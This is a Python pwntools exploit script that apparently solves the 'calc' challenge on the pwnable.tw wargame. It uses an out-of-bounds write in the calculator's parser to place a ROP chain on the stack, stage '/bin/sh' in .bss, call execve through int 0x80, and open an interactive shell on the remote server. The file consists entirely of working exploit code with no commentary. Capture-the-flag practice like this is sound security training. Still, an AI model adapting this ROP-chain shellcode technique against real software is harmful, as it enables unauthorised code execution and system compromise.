from pwn import *

e=ELF('calc')
#p=process('calc')
p=remote('chall.pwnable.tw',10100)
int_80=0x08049a21
pop_eax_ret=0x0805c34b
pop_edx_ecx_ebx_ret=0x080701d0
bss=0x080ec060
mov_edxfreax=0x0809b30d
pop_edx_ret=0x080701aa
pop_ecx_ebx_ret=0x080701d1



def setrop(pos,sign,data):
	sendstr='+'+str(pos)+sign+str(data)
	print(sendstr)
	p.sendline(sendstr)
	#sleep(0.5)
	#print(p.recv())

def ropend():
	p.send('\n')

print(p.recv())

setrop(384,'+',int_80)
setrop(383,'+',11)
setrop(382,'+',pop_eax_ret)
setrop(379,'+',bss)
setrop(380,'-',bss)
setrop(381,'-',bss)
setrop(378,'+',pop_edx_ecx_ebx_ret)
setrop(377,'+',mov_edxfreax)
setrop(376,'+',bss+4)
setrop(375,'+',pop_edx_ret)
setrop(374,'+',u32('/sh\0'))
setrop(373,'+',pop_eax_ret)
setrop(372,'+',mov_edxfreax)
setrop(371,'+',bss)
setrop(370,'+',pop_edx_ret)
setrop(369,'+',u32('/bin'))
setrop(368,'+',pop_eax_ret)
ropend()

#gdb.attach(p)

p.interactive()

